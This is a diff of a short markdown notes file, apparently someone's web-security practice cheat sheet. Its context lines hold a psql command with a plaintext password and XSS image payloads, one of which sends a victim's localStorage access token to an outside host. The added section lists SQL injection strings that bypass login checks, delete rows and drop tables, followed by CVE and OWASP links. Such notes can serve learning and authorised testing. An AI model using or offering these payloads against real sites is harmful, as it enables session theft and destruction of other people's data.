@@ -19,3 +19,14 @@ PGPASSWORD=1234 psql -h frankfurt-postgres.render.com -U target target -f db.sql
 <img src="" onerror="console.log(localStorage.getItem('accessToken'))" >
 <img src="" onerror="fetch('https://dropzone.onrender.com/?q='+localStorage.getItem('accessToken'))" >
 ```
+
+# SQL Injection
+
+```
+' OR '0' = '0
+p'); delete from post where ('1'='1
+p'); drop table post; select * from users where ('1'='1
+```
+
+https://www.cvedetails.com/vulnerabilities-by-types.php
+https://owasp.org/www-project-top-ten/
